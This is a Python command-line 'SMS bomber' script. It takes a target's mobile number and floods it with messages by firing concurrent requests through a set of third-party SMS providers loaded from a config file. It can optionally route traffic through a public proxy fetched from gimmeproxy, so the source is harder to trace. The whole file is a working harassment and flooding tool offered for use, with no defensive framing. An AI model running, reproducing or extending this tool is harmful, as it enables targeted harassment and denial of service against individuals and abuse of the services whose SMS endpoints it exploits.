  
#!/usr/bin/python3

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
import json
import time
from Provider import Provider

# args

parser = argparse.ArgumentParser()
parser.add_argument('target', metavar='TARGET', type=lambda value: (_ for _ in ()).throw(argparse.ArgumentTypeError(f'{value} is an invalid mobile number')) if len(value) != 10 else value,
                    help='Target mobile number without country code')
parser.add_argument('--sms', '-S', type=int,
                    help='Number of sms to target (default: 20)', default=20)
parser.add_argument('--country', '-c', type=int,
                    help='Country code without (+) sign (default: 91)', default=91)
parser.add_argument('--threads', '-T', type=int,
                    help='Max number of concurrent HTTP(s) requests (default: 20)', default=20)
parser.add_argument('--proxy', '-p', action='store_true',
                    help='Use proxy for bombing (It is advisable to use this option if you are bombing more than 50 sms)')
parser.add_argument('--verbose', '-v', action='store_true',
                    help='Verbose')
parser.add_argument('--verify', '-V', action='store_true',
                    help='To verify all providers are working or not')
args = parser.parse_args()

# config loading
target = str(args.target)
no_of_threads = args.threads
no_of_sms = args.sms
fails, success = 0, 0
not args.verbose and not args.verify and print(
    f'Target: {target} | Threads: {no_of_threads} | SMS: {no_of_sms}')

# proxy setup
# https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true


def get_proxy():
    args.verbose and print('Gethering proxy...')
    curl = requests.get(
        'https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true').text
    if 'limit' in curl:
        print('Proxy limitation error. Try without `-p` or `--proxy` argument')
        exit()
    args.verbose and print(f'Using Proxy: {curl}')
    return {"http": curl, "https": curl}


proxies = get_proxy() if args.proxy else False
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# bomber function


def bomber(p):
    global fails, success, no_of_sms
    if not args.verify and p is None or success > no_of_sms:
        return
    elif not p.done:
        try:
            p.start()
            if p.status():
                success += 1
            else:
                fails += 1
        except:
            fails += 1
            args.verbose or args.verify and print(
                '{:12}: error'.format(p.config['name']))
    not args.verbose and not args.verify and print(
        f'Bombing : {success+fails}/{no_of_sms} | Success: {success} | Failed: {fails}', end='\r')


# threadsssss
start = time.time()
if args.verify:
    providers = json.load(open('config.json', 'r'))['providers']
    pall = [p for x in providers.values() for p in x]
    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
        for config in pall:
            executor.submit(bomber, Provider(target, proxy=proxies,
                    verbose=True, cc=str(args.country), config=config))
        print(f'Total {len(pall)} providers available')
else:
    with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
        for i in range(no_of_sms):
            p = Provider(target, proxy=proxies,
                         verbose=args.verbose, cc=str(args.country))
            executor.submit(bomber, p)
end = time.time()


# finalize
print(f'\nSuccess: {success} | Failed: {fails}')
print(f'Took {end-start:.2f}s to complete')